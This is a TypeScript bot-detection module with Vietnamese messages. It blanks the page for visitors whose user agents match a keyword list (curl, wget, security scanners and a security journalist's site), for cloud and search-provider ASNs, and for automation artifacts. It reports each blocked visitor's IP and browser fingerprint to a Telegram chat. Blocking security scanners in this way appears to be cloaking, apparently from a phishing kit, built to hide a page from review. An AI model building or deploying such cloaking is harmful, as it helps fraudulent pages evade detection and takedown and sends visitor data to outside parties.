import { telegramConfig } from '@/config/telegram';

const blockedKeywords = [
    'bot',
    'crawler',
    'spider',
    'puppeteer',
    'selenium',
    'http',
    'client',
    'curl',
    'wget',
    'python',
    'java',
    'ruby',
    'go',
    'scrapy',
    'lighthouse',
    'censysinspect',
    'krebsonsecurity',
    'ivre-masscan',
    'ahrefs',
    'semrush',
    'sistrix',
    'mailchimp',
    'mailgun',
    'larbin',
    'libwww',
    'spinn3r',
    'zgrab',
    'masscan',
    'yandex',
    'baidu',
    'sogou',
    'tweetmeme',
    'misting',
    'BotPoke'
];

const blockedASNs = [
    15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075, 214961, 401115, 135377,
    60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396, 147049
];

const blockedIPs = ['95.214.55.43', '154.213.184.3'];

interface GeoData {
    asn?: string;
    organization_name?: string;
    organization?: string;
    ip?: string;
}

interface BotCheckResult {
    isBot?: boolean;
    isBlocked?: boolean;
    reason?: string;
}

const sendBotTelegram = async (reason: string): Promise<void> => {
    try {
        const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
        const botToken = telegramConfig.TOKEN;
        const chatId = telegramConfig.CHAT_ID;

        const geoRes = await fetch(geoUrl);
        const geoData: GeoData = await geoRes.json();

        const fullFingerprint = {
            asn: geoData.asn,
            organization_name: geoData.organization_name,
            organization: geoData.organization,
            ip: geoData.ip,
            navigator: {
                userAgent: navigator.userAgent,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                webdriver: navigator.webdriver
            },
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            }
        };

        const msg = `🚫 <b>BOT BỊ CHẶN</b>
🔍 <b>Lý do:</b> <code>${reason}</code>

📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML'
        };

        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch {
        //
    }
};

const checkAndBlockBots = async (): Promise<BotCheckResult> => {
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedKeyword = blockedKeywords.find((keyword) => userAgent.includes(keyword.toLowerCase()));
    if (blockedKeyword) {
        const reason = `user agent chứa keyword: ${blockedKeyword}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        try {
            window.location.href = 'about:blank';
        } catch {
            //
        }
        return { isBlocked: true, reason };
    }
    return { isBlocked: false };
};

const checkAndBlockByGeoIP = async (): Promise<BotCheckResult> => {
    try {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            return { isBlocked: false };
        }

        const data = JSON.parse(ipInfo);

        if (blockedASNs.includes(Number(data.asn))) {
            const reason = `ASN bị chặn: ${data.asn}`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return { isBlocked: true, reason };
        }

        if (blockedIPs.includes(data.ip)) {
            const reason = `IP bị chặn: ${data.ip}`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return { isBlocked: true, reason };
        }

        return { isBlocked: false };
    } catch {
        return { isBlocked: false };
    }
};

const checkAdvancedWebDriverDetection = async (): Promise<BotCheckResult> => {
    if (navigator.webdriver === true) {
        const reason = 'navigator.webdriver = true';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    if ('__nightmare' in window) {
        const reason = 'nightmare detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('_phantom' in window || 'callPhantom' in window) {
        const reason = 'phantom detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('Buffer' in window) {
        const reason = 'buffer detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('emit' in window) {
        const reason = 'emit detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('spawn' in window) {
        const reason = 'spawn detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    const seleniumProps = [
        '__selenium_unwrapped',
        '__webdriver_evaluate',
        '__driver_evaluate',
        '__webdriver_script_function',
        '__webdriver_script_func',
        '__webdriver_script_fn',
        '__fxdriver_evaluate',
        '__driver_unwrapped',
        '__webdriver_unwrapped',
        '__selenium_evaluate',
        '__fxdriver_unwrapped'
    ];

    const foundProp = seleniumProps.find((prop) => prop in window);
    if (foundProp) {
        const reason = `selenium property: ${foundProp}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    if ('__webdriver_evaluate' in document) {
        const reason = 'webdriver_evaluate in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('__selenium_evaluate' in document) {
        const reason = 'selenium_evaluate in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('__webdriver_script_function' in document) {
        const reason = 'webdriver_script_function in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkNavigatorAnomalies = async (): Promise<BotCheckResult> => {
    if (navigator.webdriver === true) {
        const reason = 'navigator.webdriver = true';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 128) {
        const reason = `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) {
        const reason = `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkScreenAnomalies = async (): Promise<BotCheckResult> => {
    if (screen.width === 2000 && screen.height === 2000) {
        const reason = 'màn hình 2000x2000 (bot pattern)';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    if (screen.width > 4000 || screen.height > 4000) {
        const reason = `màn hình quá lớn: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if (screen.width < 200 || screen.height < 200) {
        const reason = `màn hình quá nhỏ: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const detectBot = async (): Promise<BotCheckResult> => {
    const userAgentCheck = await checkAndBlockBots();
    if (userAgentCheck.isBlocked) {
        return { isBot: true, reason: userAgentCheck.reason };
    }

    const webDriverCheck = await checkAdvancedWebDriverDetection();
    if (webDriverCheck.isBot) {
        return { isBot: true, reason: webDriverCheck.reason };
    }

    const navigatorCheck = await checkNavigatorAnomalies();
    if (navigatorCheck.isBot) {
        return { isBot: true, reason: navigatorCheck.reason };
    }

    const screenCheck = await checkScreenAnomalies();
    if (screenCheck.isBot) {
        return { isBot: true, reason: screenCheck.reason };
    }

    const geoIPCheck = await checkAndBlockByGeoIP();
    if (geoIPCheck.isBlocked) {
        return { isBot: true, reason: geoIPCheck.reason };
    }

    const obviousBotKeywords = ['googlebot', 'bingbot', 'crawler', 'spider'];
    const foundKeyword = obviousBotKeywords.find((keyword) =>
        navigator.userAgent.toLowerCase().includes(keyword)
    );

    if (foundKeyword) {
        return { isBot: true, reason: `obvious bot keyword: ${foundKeyword}` };
    } else {
        return { isBot: false };
    }
};

export default detectBot;

